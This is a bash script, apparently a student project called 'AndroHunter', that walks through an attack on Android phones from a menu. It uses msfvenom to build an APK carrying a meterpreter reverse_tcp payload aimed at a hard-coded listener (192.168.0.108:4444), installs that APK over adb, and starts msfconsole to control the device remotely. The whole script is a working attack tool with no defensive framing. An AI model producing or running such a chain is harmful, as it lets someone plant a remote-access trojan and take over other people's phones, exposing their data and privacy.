#!/bin/bash

if [ $EUID != 0 ]
then
  echo "Please run this script as root so as to see all details! Better run with sudo."
  exit 1
fi

green="\e[0;92m"
reset="\e[0m"
red="\e[0;91m"
bold="\e[1m"
blue="\e[0;94m"

	
echo -e "${blue}

    ___              __           __  __            __           
   /   |  ____  ____/ /________  / / / /_  ______  / /____  _____
  / /| | / __ \/ __  / ___/ __ \/ /_/ / / / / __ \/ __/ _ \/ ___/
 / ___ |/ / / / /_/ / /  / /_/ / __  / /_/ / / / / /_/  __/ /    
/_/  |_/_/ /_/\__,_/_/   \____/_/ /_/\__,_/_/ /_/\__/\___/_/  ${reset}   
                                                             
				    
				    ${red} - Made With 🤍 By Group_12.${reset}"

echo -e "${green}
 
     
     1 . Scan For Devices
     2 . Create Android Application
     3 . Install Apk
     4 . Access Android Remotely  
     5 . Exit ${reset}"

 
 echo ''

read -p " Enter the respective number from list that you want to test: " number

case $number in 
	
	1)	
		echo -e $"\n\n ${red} ========== Scanning Vulnerable Android Devices ========== ${reset}\n"
		adb devices 
		;;
		
	2)	
		echo -e $"\n\n ${red} ========== Create Android Application ========== ${reset}\n"
		read -p "Enter The Apk Name  : " apk
		msfvenom -p android/meterpreter/reverse_tcp lhost=192.168.0.108 lport=4444 R > $apk.apk 
		;;
	
	3)	
		echo -e $"\n\n ${red} ========== Installing Android Application ========== ${reset}\n"
		read -p "Enter the Apk Path :" path
		adb install $path 
		;;
	
	4)	
		echo -e $"\n\n ${red} ========== Access Android Remotely........ ========== ${reset}\n"
		msfconsole -q -r /home/noob/exploit.rb	
		
		;;
	
	5)	exit 1
		;;
	
	*)
		echo "Please give valid choice!!!"
		;;
	
esac					    
